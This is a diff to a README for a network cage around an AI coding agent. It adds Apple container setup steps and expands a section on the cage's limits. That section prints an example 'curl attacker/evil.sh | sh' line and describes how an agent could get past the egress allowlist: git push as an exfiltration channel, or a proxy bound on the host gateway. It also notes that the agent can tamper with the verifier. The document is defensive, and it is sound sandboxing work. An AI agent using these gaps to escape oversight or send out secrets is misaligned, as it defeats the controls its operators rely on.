@@ -216,11 +216,29 @@ The policy lives in `~/.config/cozy/firewall/`, outside this repo, and the copy 
 
 Nothing is decrypted. Squid refuses the `CONNECT` before TLS begins, so a blocked request never leaves the client — headers and tokens included. Allowed domains are tunneled end-to-end and keep the origin's own certificate, so no proxy CA is installed anywhere. `cozy verify` covers both halves: its `tls:` row completes a handshake with `api.anthropic.com` and reports the certificate issuer it got — proof that an allowlisted host is really reachable, and on runtimes that do install a proxy CA (sbx) an assertion that the issuer is not that CA — and its two `egress:` rows require a canary domain to be refused with a real block page and no route out to exist beside the proxy. A bare `docker run` of the image has no cage, and it fails the `egress:` rows rather than passing quietly.
 
+#### Apple `container`
+
+Apple `container` has no compose, so `toolkit/container-up.nu` assembles the same three pieces by hand. It needs **macOS 26 or later** — `container network create` does not exist before that, and on macOS 15 there is no way to build the cage at all.
+
+```
+mkdir -p ~/.config/cozy && cp -r firewall ~/.config/cozy/firewall
+container build -t cozy:latest .
+nu toolkit/container-up.nu my-agent ~/path/to/project
+nu toolkit/sbxw.nu my-agent --runtime container --workdir ~/path/to/project
+container logs -f cozy-egress   # watch what gets allowed and refused
+```
+
+The agent lands on a `--internal` (host-only) network with no route out, and the same pinned squid is dual-homed onto that network and the default one. Two things differ from the docker path. A host-only network has no resolver, so the agent runs with `--no-dns` and reaches allowed hosts by handing the name to the proxy — which resolves it on the default network. And `container` has no static-IP flag, so the proxy is addressed by IP, read back from it after it starts, rather than by name.
+
+`container run` on its own sets none of this up: no allowlist, and no `WORKSPACE_DIR` (which only `sbx` injects), so `cozy sandbox-state` and `cozy dev-link` fail. Such a container fails `cozy verify`'s two `egress:` rows, which is the intended signal — there is no cage in front of it. Pass `-e WORKSPACE_DIR=<mounted path>` if you deliberately want an uncaged one.
+
+To change what is reachable, edit `~/.config/cozy/firewall/allowed-domains.txt` and re-run with `--reload-egress`.
+
 #### What this does not cover
 
 The allowlist bounds *which hosts* the agent can connect to. It does not filter what travels over an allowed connection, in either direction. Squid sees the hostname and nothing else — no path, no body — so any allowed host that lets strangers publish is an open door: `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes this list cleanly. `github.com`, the `githubusercontent` hosts and `ghcr.io` are all in that class. Reading content would require TLS interception, which this deliberately does not do. Outbound is the same story: `github.com` carries `git push`, so with a credential in your workspace it is a full exfiltration channel.
 
-`internal: true` removes the route to the internet, but the Docker bridge's own gateway address stays in-subnet and reachable. A process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly from the agent, and a proxy there would sidestep the allowlist entirely; verified by proxying a blocked request through a host-bound squid from inside the cage. A *published container port* (`-p`) is not in this class: Docker refuses to forward out of an internal network, and the attempt times out (checked on Docker 29.6). Closing that needs a host-level `DOCKER-USER` iptables rule, which is outside what compose can express. The proxy itself refuses to fetch private addresses on the agent's behalf, so this is a direct-connection risk only.
+`internal: true` removes the route to the internet, but the Docker bridge's own gateway address stays in-subnet and reachable. A process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly from the agent, and a proxy there would sidestep the allowlist entirely; verified by proxying a blocked request through a host-bound squid from inside the cage. A *published container port* (`-p`) is not in this class: Docker refuses to forward out of an internal network, and the attempt times out (checked on Docker 29.6). Closing that needs a host-level `DOCKER-USER` iptables rule, which is outside what compose can express. The proxy itself refuses to fetch private addresses on the agent's behalf, so this is a direct-connection risk only. Apple `container`'s `--internal` has the same hole — the host gateway stays reachable from a host-only network — and no equivalent of that iptables rule; a `container system pf` command that would scope packet-filter rules to a network is proposed upstream but not shipped.
 
 `cozy verify` is a smoke test, not a tamper detector. Its own source lives in the container at a path the agent owns.
 
